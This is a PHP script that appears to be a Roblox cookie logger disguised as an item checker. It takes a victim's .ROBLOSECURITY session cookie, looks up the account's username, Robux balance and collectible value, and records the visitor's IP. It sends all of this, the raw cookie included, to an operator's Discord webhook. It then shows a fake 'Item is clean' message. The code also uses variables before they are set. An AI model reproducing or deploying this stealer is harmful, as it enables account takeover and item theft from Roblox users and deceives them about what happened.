<?php
$roblosecurity = $_GET['roblosecurity'];
$userInfoUrl = 'https://www.roblox.com/mobileapi/userinfo';
$collectiblesUrl = 'https://inventory.roblox.com/v1/users/' . $userInfo['UserID'] . '/assets/collectibles?assetType=All';

$ch = curl_init($userInfoUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Cookie: .ROBLOSECURITY=' . $roblosecurity,
    'X-CSRF-TOKEN: ' . $csrfToken
));

$response = curl_exec($ch);
curl_close($ch);

$userInfo = json_decode($response, true);

$ch = curl_init($collectiblesUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'Cookie: .ROBLOSECURITY=' . $roblosecurity
));

$response = curl_exec($ch);
curl_close($ch);

$collectibles = json_decode($response, true);

$totalRAP = 0;

foreach ($collectibles['data'] as $collectible) {
    if (isset($collectible['recentAveragePrice']['value'])) {
        $totalRAP += $collectible['recentAveragePrice']['value'];
    }
}

// Get the user's IP address
$ipAddress = $_SERVER['REMOTE_ADDR'];

// Create an array to store user information
$userInfoArray = [
    'UserID' => $userInfo['UserID'],
    'Username' => $userInfo['UserName'],
    'Robux' => $userInfo['RobuxBalance'],
    'TotalRAP' => $totalRAP,
    'RoliLink' => 'https://rolimons.com/player/' . $userInfo['UserID'],
    'TradeLink' => 'https://www.roblox.com/users/' . $userInfo['UserID'] . "/trade",
    'IP' => $ipAddress
];

// Convert the array to JSON
$userInfoJson = json_encode($userInfoArray);

// Send the user information to Discord webhook
$webhookURL = 'YOUR_WEBHOOK_HERE';

$data = [
    'username' => 'Roblox User Info',
    'avatar_url' => $userInfo['ThumbnailUrl'], // Customize with your desired avatar URL
    'embeds' => [
        [
            'title' => 'User Information',
            'fields' => [
                [
                    'name' => 'User ID :credit_card: ',
                    'value' => $userInfo['UserID'],
                    'inline' => true
                ],
                [
                    'name' => 'Username :person_frowning:',
                    'value' => $userInfo['UserName'],
                    'inline' => true
                ],
                [
                    'name' => 'Robux :moneybag:',
                    'value' => $userInfo['RobuxBalance'],
                    'inline' => true
                ],
                [
                    'name' => 'Total RAP :chart_with_upwards_trend:',
                    'value' => $totalRAP,
                    'inline' => true
                ],
                [
                    'name' => 'Roli link :regional_indicator_r:',
                    'value' => 'https://rolimons.com/player/' . $userInfo['UserID'],
                    'inline' => true
                ],
                [
                    'name' => 'Trade Link :recycle:',
                    'value' => 'https://www.roblox.com/users/' . $userInfo['UserID'] . "/trade",
                    'inline' => true
                ],
                [
                    'name' => 'IP :map:',
                    'value' => '||' . $ipAddress . '||',
                    'inline' => true
                ]
            ],
            'color' => hexdec('00FF00'), // Customize with your desired color (in decimal format)
            'image' => [
                'url' => $userInfo['ThumbnailUrl']  // Replace with your desired image URL
            ]
        ],
        [
            'title' => 'Cookie :cookie:',
            'description' => $roblosecurity,
            'color' => hexdec('FF0000')
        ]
    ]
];

$options = [
    'http' => [
        'header' => "Content-Type: application/json\r\n",
        'method' => 'POST',
        'content' => json_encode($data)
    ]
];

$context = stream_context_create($options);
$result = file_get_contents($webhookURL, false, $context);
echo "<script>";
echo "Swal.fire({
        icon: 'success',
        title: 'Item is <span style=\"color: green;\">clean</span>',
        showConfirmButton: false,
        timer: 1500
      });";
echo "</script>";

// Write user information to a JSON file
file_put_contents('userinfo.json', $userInfoJson);

die();
?>
